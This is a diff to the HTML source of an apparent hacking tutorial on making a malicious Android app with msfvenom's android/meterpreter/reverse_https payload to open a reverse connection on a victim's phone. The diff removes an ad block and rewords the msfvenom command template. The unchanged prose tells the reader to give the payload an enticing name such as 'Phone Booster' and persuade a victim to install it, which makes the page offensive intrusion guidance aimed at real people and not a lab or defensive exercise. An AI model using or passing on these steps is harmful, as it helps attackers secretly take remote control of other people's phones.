@@ -117,18 +117,6 @@ element.addEventListener('click', func);
 				Well this step will not involve any commands or execution, this step is just for theory, however don't skip it. This section is necessary for you to understand the commands and why they are used futher in the tutorial.<br><br>
 
 				Okay so in short we have to generate an apk file [ it will also be called the 'payload' later in the tutorial ] and send it to the victim. By the time the victim downloads and installs the apk, we have to set-up a backdoor listner so that ... as soon as the victim starts or runs our payload [ installed apk file ], we get a reverse connection on our listner. Our installed malicious application on the victim's device will act as a pathway for us to execute remote commands on the victim's phone. So here the challenging part is that we have to convince our victim to somehow download, install and run our application. Alright now it seems clear that our payload name must be attracting. You can take any name like, 'Bubble Shooter', 'Counter Strike : Global Offensive [ Android Version ]', 'Phone booster', etc. I personally perfer 'Phone Booster'. So now let's go ahead!
-
-				<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-						<!-- Horizontal ad (custom) -->
-					<ins class="adsbygoogle"
-     						style="display:block"
-						     data-ad-client="ca-pub-6203666289882469"
- 						     data-ad-slot="6275962994"
-						     data-ad-format="auto"
- 						     data-full-width-responsive="true"></ins>
-						<script>
-     							(adsbygoogle = window.adsbygoogle || []).push({});
-						</script>
 					
 				<h1><u>STEP 2 - Generating the payload</u></h1>
 
@@ -148,7 +136,7 @@ element.addEventListener('click', func);
 
 				We will choose the payload <b>'android/meterpreter/reverse_https'</b> to establish a reverse https connection over the local network. Now the format for creating a payload apk is like this:-<br><br>
 
-				msfvenom -p [Payload_Name] LHOST=[Your_IPv4] LPORT=[Any_port_through_which_connection_should_be_established] -o [Output_filename].apk<br><br>
+				msfvenom -p [Payload_Name] LHOST=[Your_IPv4] LPORT=[Any_port_number] -o [Output_filename].apk<br><br>
 
 				So the proper command is :-<br><br>
 
